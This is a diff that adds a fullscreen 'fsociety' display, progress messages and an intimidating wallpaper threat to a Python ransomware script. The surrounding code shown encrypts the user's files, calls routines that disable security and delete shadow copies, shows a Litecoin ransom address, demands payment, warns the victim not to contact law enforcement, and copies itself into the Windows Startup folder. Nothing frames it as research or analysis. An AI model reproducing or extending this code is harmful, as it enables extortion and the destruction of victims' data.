@@ -16,6 +16,41 @@ LTC_ADDRESS = "LdyX3fNpWfUHowcHszy4uMNeL7ho6YUFXz"
 RANSOM_AMOUNT = "$250 USD in Litecoin"
 DECRYPT_KEY = "agent77"
 
+def fullscreen_cmd():
+    """Open fullscreen command prompt with red text"""
+    try:
+        # Create fullscreen cmd with red text
+        os.system('mode con: cols=120 lines=40')
+        os.system('color 4F')
+        # Maximize window
+        import ctypes
+        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
+        ctypes.windll.user32.ShowWindow(hwnd, 3)  # SW_MAXIMIZE
+    except:
+        pass
+
+def fsociety_ui():
+    """Display fsociety ASCII art and status"""
+    os.system('cls')
+    banner = r'''
+   ______   ______   ______   ______   ______   ______   ______   ______
+  /\  == \ /\  ___\ /\  ___\ /\  == \ /\  ___\ /\  ___\ /\  ___\ /\  __ \
+  \ \  __< \ \  __\ \ \  __\ \ \  __< \ \  __\ \ \  __\ \ \  __\ \ \  __/
+   \ \_\ \_\ \ \_____\ \_____\ \ \_\ \_\ \_____\ \ \_____\ \ \_____\ \ \_\
+    \/_/ /_/  \/_____/ \/_____/ \/_/ /_/ \/_____/ \/_____/ \/_____/ \/_/
+  .---.  .---.  .---.  .---.  .---.  .---.  .---.  .---.  .---.  .---.  .---.
+  | F |  | S |  | O |  | C |  | I |  | E |  | T |  | Y |  | 2 |  | . |  | 0 |
+  '---'  '---'  '---'  '---'  '---'  '---'  '---'  '---'  '---'  '---'  '---'
+    '''
+    print(banner)
+    print("\n" + "="*80)
+    print("           [*] FSOCIETY RANSOMWARE v2.9.0 [*]".center(80))
+    print("="*80)
+    print("\n[+] Initializing encryption sequence...")
+    print("[+] Disabling security protocols...")
+    print("[+] Deleting shadow copies...")
+    print("[+] Encrypting files...\n")
+
 def generate_key():
     return get_random_bytes(32)
 
@@ -75,6 +110,10 @@ def encrypt_directory(directory, key, iv, extensions=None):
             if ext in extensions and not file.endswith('.encrypted'):
                 if encrypt_file(file_path, key, iv):
                     count += 1
+                    # Show progress
+                    if count % 10 == 0:
+                        sys.stdout.write(f"\r[+] Encrypted: {count} files...")
+                        sys.stdout.flush()
                 try:
                     os.rename(file_path, file_path + '.encrypted')
                 except:
@@ -155,18 +194,25 @@ def change_wallpaper():
             font = ImageFont.truetype("arial.ttf", 72)
             font2 = ImageFont.truetype("arial.ttf", 48)
             font3 = ImageFont.truetype("arial.ttf", 30)
+            font4 = ImageFont.truetype("arial.ttf", 24)
         except:
             font = ImageFont.load_default()
             font2 = ImageFont.load_default()
             font3 = ImageFont.load_default()
+            font4 = ImageFont.load_default()
+        
+        # fsociety logo
         text = "F SOCIETY\nYOUR FILES ARE ENCRYPTED"
         draw.text((100, 300), text, fill=(255, 0, 0), font=font)
         draw.text((100, 550), "Pay $250 in Litecoin", fill=(255, 255, 255), font=font2)
         draw.text((100, 650), "LdyX3fNpWfUHowcHszy4uMNeL7ho6YUFXz", fill=(0, 255, 0), font=font3)
         draw.text((100, 750), "To decrypt, run: python ransomware.py --decrypt agent77", fill=(255, 255, 0), font=font3)
+        draw.text((100, 850), "You have 72 hours. Don't contact law enforcement.", fill=(255, 255, 255), font=font4)
+        
         wallpaper_path = os.environ['TEMP'] + '\\fsociety_wallpaper.bmp'
         img.save(wallpaper_path)
         ctypes.windll.user32.SystemParametersInfoW(0x0014, 0, wallpaper_path, 3)
+        
         key = winreg.HKEY_CURRENT_USER
         subkey = r"Control Panel\Desktop"
         handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
@@ -226,6 +272,10 @@ def show_popup():
         0x10 | 0x1)
 
 def main():
+    # Fullscreen UI
+    fullscreen_cmd()
+    fsociety_ui()
+    
     if len(sys.argv) >= 3 and sys.argv[1] == '--decrypt':
         if sys.argv[2] == DECRYPT_KEY:
             try:
@@ -238,9 +288,11 @@ def main():
                         key = base64.b64decode(key_match.group(1))
                         iv = base64.b64decode(iv_match.group(1))
                         count = decrypt_all_files(key, iv)
+                        print(f"\n[+] DECRYPTION COMPLETE! {count} files restored.")
                         ctypes.windll.user32.MessageBoxW(0, 
                             f"DECRYPTION COMPLETE!\n{count} files restored.",
                             "F SOCIETY", 0x40)
+                        time.sleep(3)
                         sys.exit(0)
             except:
                 pass
@@ -257,30 +309,46 @@ def main():
         key_hex = base64.b64encode(key).decode()
         iv_hex = base64.b64encode(iv).decode()
         
+        print("[+] Disabling security...")
         disable_security()
+        
+        print("[+] Deleting shadow copies...")
         delete_shadow_copies()
         
+        print("[+] Encrypting files...")
         total_encrypted = 0
         for directory in get_target_directories():
             try:
                 count = encrypt_directory(directory, key, iv)
                 total_encrypted += count
+                print(f"\n[+] Encrypted {count} files in {directory}")
             except:
                 pass
         
+        print(f"\n[+] Total files encrypted: {total_encrypted}")
+        
+        print("[+] Changing wallpaper...")
         change_wallpaper()
+        
+        print("[+] Creating ransom note...")
         create_ransom_note(key_hex, iv_hex)
         
+        print("[+] Done! Showing popup...")
         show_popup()
         
         try:
             startup = os.environ.get('APPDATA', '') + '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
             shutil.copy2(sys.argv[0], startup + '\\fsociety_ransomware.exe')
+            print("[+] Added to startup.")
         except:
             pass
         
-    except:
-        pass
+        print("\n[+] Press any key to exit...")
+        os.system('pause >nul')
+        
+    except Exception as e:
+        print(f"[-] Error: {e}")
+        time.sleep(5)
 
 if __name__ == "__main__":
     main()
